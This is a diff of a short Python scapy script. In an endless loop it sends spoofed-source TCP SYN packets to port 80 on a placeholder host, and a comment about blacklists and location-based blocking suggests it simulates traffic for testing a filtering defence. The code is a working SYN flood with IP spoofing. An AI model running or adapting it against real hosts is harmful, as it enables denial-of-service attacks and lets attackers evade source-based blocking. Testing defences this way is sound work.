@@ -2,13 +2,14 @@ import time
 from scapy.layers.inet import TCP, IP
 from scapy.sendrecv import send
 
-# Define the target and spoofed IP
+"""
+Simulate sending packets to a target IP address from a spoofed source IP.
+"""
 target_ip = "www.example.com"
-spoofed_ip = "192.168.1.100"
+spoofed_ip = "1.32.232.0"# This IP-address is not in th blacklist, as this is being blocked based on its location unlike the IP-address in the other sim file.
 target_port = 80
 
-# Create and send SYN packets
 while True:
     packet = IP(src=spoofed_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
-    send(packet, count=10)# Send 10 packets
+    send(packet, count=10)
     time.sleep(1)
